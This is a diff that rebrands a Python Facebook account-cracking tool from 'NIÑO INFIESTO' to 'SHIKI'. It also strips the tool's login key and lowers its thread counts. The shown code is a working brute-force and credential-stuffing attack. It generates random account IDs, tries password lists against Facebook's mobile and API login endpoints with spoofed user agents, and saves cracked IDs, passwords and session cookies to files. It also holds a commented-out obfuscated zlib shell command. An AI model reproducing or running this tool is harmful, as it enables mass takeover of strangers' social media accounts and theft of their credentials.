@@ -1,6 +1,6 @@
-#NINO INFIESTO
-#Facebook:https://www.facebook.com/Profile.infiesto
-#Github : https://github.com/Ninoutog
+#NIÑO INFIESTO
+#Facebook: Niño infiesto
+#Github : https://github.com/Ninouto
 from os import path
 import os,base64,zlib,pip,urllib
 try:
@@ -62,53 +62,40 @@ for x in range(10000):
 	l='Mobile Safari/537.36 Sleipnir/3.5.28'
 	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	useragent.append(uakua)
-
+print('\033[1;92m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 #menu_apikey()
 os.system('clear')
-logo = (""" 
- ██▓   ▓██   ██▓ ███▄    █ ▒██   ██▒
-▓██▒    ▒██  ██▒ ██ ▀█   █ ▒▒ █ █ ▒░
-▒██░     ▒██ ██░▓██  ▀█ ██▒░░  █   ░
-▒██░     ░ ▐██▓░▓██▒  ▐▌██▒ ░ █ █ ▒ 
-░██████▒ ░ ██▒▓░▒██░   ▓██░▒██▒ ▒██▒
-░ ▒░▓  ░  ██▒▒▒ ░ ▒░   ▒ ▒ ▒▒ ░ ░▓ ░
-░ ░ ▒  ░▓██ ░▒░ ░ ░░   ░ ▒░░░   ░▒ ░
-  ░ ░   ▒ ▒ ░░     ░   ░ ░  ░    ░  
-    ░  ░░ ░              ░  ░    ░  
-        ░ ░                                                                                                                                         
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- ┃ [\033[1;91m✓\033[1;92m] CREATOR   \033[1;91m: \033[1;92mNIÑO INFIESTO      
- ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mCLONING TOOL             
- ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mPAID                       
- ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                    
- ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mwww.facebook.com/100080607586393              
- ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.7         
- ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+logo = ("""  
+ ╔──¤ ◎ MAKE BY SHIKI
+ │┎─────────────────┐
+ │┡─≫ BRUTEFORCE 2.0.0        │
+ │└─────────────────┘
+ │┌[  author       shiki
+ │├[  version      2.0 
+ │├[ status         private
+ │├[ replit           blank
+ │├[ github         blank
+ │└[ hope you like it 
+ │
+ ╚──¤ ◎
+ ┌──────────────────|
+ └─≫  choose properly:
+""")
 
 def linex():
-        print('\033[1;92m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print(' ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    
 def clear():
-        os.system(f'clear')
-        print(logo)
+    os.system(f'clear')
+    print(logo)
+    
 loop=0
 oks=[]
 cps=[]
 pcp=[]
 id=[]
 tokenku=[]
-# LOGIN_KEY
-correct_username = 'papanins'
-key = 'true'
 
-while key == 'true':
-    username = input('\3[0;97m[•]\3[1;96m~~~~~>\3[1;92mMAY KEY PA TANGA \3[1;91m: ')
-
-    if username == correct_username:
-        print('\3[1;37m-----------------------------------------------\3[0;97m[•]\3[1;32m WELCOME TO NIÑO INFIESTO TOOL ')
-        time.sleep(1)
-        # Assuming clear() is a function to clear the screen
-        clear()
-        key = 'false'
 def fucked():
 	print(' Server Loadin.......')
 	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
@@ -132,10 +119,10 @@ def ckx():
 			sys.exit()
 def Spy():
 	clear()
-	print(f" [1] File Crack")
-	print(f" [2] Random Crack")
-	print(f" [3] Gmail Crack")
-	print(f" [0] Exit")
+	print(f" ┌[ m1  ] ≫  FC            ")
+	print(f" ├[ m2 ] ≫   RC   ")
+	print(f" ├[ m3 ] ≫   GC      ")
+	print(f" └[0]      ≫ Exit           ")
 	me=input(f'\n [?] Choose : ')
 	if me in ["2", "02"]:
 		bd()
@@ -169,7 +156,7 @@ def Spy():
 			pcp.append(f'n')
 		else:
 			pcp.append(f'y')
-		with tred(max_workers=50) as crack_submit:
+		with tred(max_workers=30) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
 			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
@@ -190,7 +177,7 @@ def Spy():
 					crack_submit.submit(api1,ids,names,passlist)
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -211,15 +198,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [NINS-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/NINS-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [SHIKI-ALIVE] %s | %s'%(ids,pas))
+                                open(f'/sdcard/SHIKI-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [NINS-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [SHIKI-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/SHIKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -233,7 +220,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 #
 def ffb1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -254,15 +241,15 @@ def ffb1(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [NINS-OK] %s | %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [SHIKI-ALIVE] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/NINS-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/SHIKI-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [NINS-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/SHIKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -276,7 +263,7 @@ def ffb1(ids,names,passlist):
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -326,15 +313,15 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [NINS-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/NINS-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [SHIKIALIVE] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/SHIKI-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [NINS-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/UTOG-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/SHIKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -347,7 +334,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -397,19 +384,19 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [NINS-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/NINS-UTOG.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [SHIKI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/SHIKI-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [NINS-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/SHIKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/NINS-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcardSHIKI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -420,7 +407,7 @@ def api1(ids,names,passlist):
                         pass
 def ffb7(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -441,15 +428,15 @@ def ffb7(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [NINS-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/NINS-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [AVI-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/SHIKI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [PAPANINS-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/SHIKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -476,7 +463,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=60) as sat:     
+                with tred(max_workers=30) as sat:     
                         clear()
                         tl = str(len(user))
                         print(f'\033[1;37m [+] Total account : \033[1;32m'+tl)
@@ -490,16 +477,16 @@ def bd():
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' Total ALIVE/CP: '+str(len(oks))+'/'+str(len(cps)))
 
 def gml():
                 user=[]
                 pcp=[]
                 clear()
                 pcp.append(f'y')
-                print('\033[1;32m Name  example:  Shahin, Sabbir, Forhad ')
+                print('\033[1;32m Name  example:  Saber, Layla, nana ')
                 code = input(' First name : ')
-                print(' Name Example : Alam, hossen, hossain')
+                print(' Name Example : Saber, Layla, nana')
                 codex = input(' Last name : ')
                 try:
                         limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -508,7 +495,7 @@ def gml():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(2,5))
                         user.append(nmp)
-                with tred(max_workers=60) as sat:     
+                with tred(max_workers=30) as sat:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -523,7 +510,7 @@ def gml():
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' Total ALIVE/CP: '+str(len(oks))+'/'+str(len(cps)))
 
 
 
@@ -539,7 +526,7 @@ def rcrack_free(idf,pwv):
 		for ps in pwv:
 	#		print(idf+'|'+ps)
 			#session = requests.Session()
-			sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(useragent)
 			free_fb = session.get('https://m.alpha.facebook.com').text
@@ -574,7 +561,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print('\n')
-				print('\033[1;92m[NINS-OK] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;92m[SHIKI-ALIVE] '+idf+' | '+ps+'\033[0;97m')
 				cek_apk(coki)
 				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
 				oks.append(idf)
@@ -583,7 +570,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\n')
-				print('\033[1;91m[NINS-CP] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;91m[INNOCENT-CP] '+idf+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
 				cps.append(idf)
 				break
@@ -591,7 +578,7 @@ def rcrack_free(idf,pwv):
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		sys.stdout.flush()
 	
 	except:
@@ -599,7 +586,7 @@ def rcrack_free(idf,pwv):
 def apix(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -644,19 +631,19 @@ def apix(ids,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [NINS-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/NINS-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [SHIKI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/SHIKI-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [NINS-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/SHIKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/NINS-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/SHIKI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
